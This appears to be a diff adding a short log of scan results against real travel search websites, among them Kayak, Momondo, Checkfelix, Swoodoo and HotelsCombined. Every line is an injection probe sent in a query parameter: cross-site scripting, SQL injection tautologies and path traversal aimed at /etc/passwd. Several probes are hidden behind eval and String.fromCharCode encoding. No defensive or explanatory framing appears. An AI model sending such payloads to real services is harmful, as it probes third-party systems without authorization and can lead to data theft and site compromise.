@@ -1,0 +1,7 @@
+[200 :: Other] https://kayak.ai?q=eval(String.fromCharCode(60,105,109,103,32,115,114,99,61,120,32,111,110,101,114,114,111,114,61,97,108,101,114,116,40,39,120,115,115,39,41,62))
+[200 :: Other] https://www.momondo.com?q=eval(String.fromCharCode(46,46,47,46,46,47,46,46,47,101,116,99,47,112,97,115,115,119,100))
+[200 :: Other] https://www.checkfelix.com?q=eval(String.fromCharCode(39,32,79,82,32,39,49,39,61,39,49))
+[200 :: Other] https://www.checkfelix.com?q=eval(String.fromCharCode(46,46,47,46,46,47,46,46,47,101,116,99,47,112,97,115,115,119,100))
+[200 :: Other] https://www.swoodoo.com?q=eval(String.fromCharCode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,49,41,60,47,115,99,114,105,112,116,62))
+[200 :: XSS] https://www.hotelscombined.com?q=<form><input name='note' value='<img src=x onerror=alert('xss')>'></form>
+[200 :: SQLi] https://www.hotelscombined.com?q=<form><input name='note' value='' OR '1'='1'></form>
